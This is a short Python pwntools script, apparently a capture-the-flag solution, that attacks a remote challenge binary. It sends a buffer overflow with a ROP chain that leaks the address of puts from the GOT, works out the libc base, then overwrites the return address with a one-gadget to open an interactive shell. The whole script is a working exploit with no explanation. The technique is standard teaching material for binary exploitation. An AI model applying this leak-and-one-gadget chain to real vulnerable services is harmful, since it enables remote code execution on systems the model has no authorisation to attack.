from pwn import *
context(terminal=['tmux','new-window'])

local = False
r = process('./chall') if local else remote('tjc.tf', 31705)
p = ELF('./chall')

pop_rdi = 0x0000000000401243

puts_offs = 0x84450
magic_offs = 0xe3b31

if __name__=='__main__':
	
	r.recvuntil('?')
	#gdb.attach(r)
	r.sendline(b'a'*16+b'b'*8+p64(pop_rdi)+p64(p.got['puts'])+p64(p.plt['puts'])+p64(p.sym['vacation']))
	r.recvline()
	puts = u64(r.recvline()[:-1]+b'\x00\x00')
	print('puts @ {}'.format(hex(puts)))
	libc_base = puts-puts_offs
	print('libc base @ {}'.format(hex(libc_base)))
	magic_gadget = libc_base+magic_offs
	print(r.recvuntil('?'))
	r.sendline(b'a'*16+b'b'*8+p64(magic_gadget))

	r.interactive()









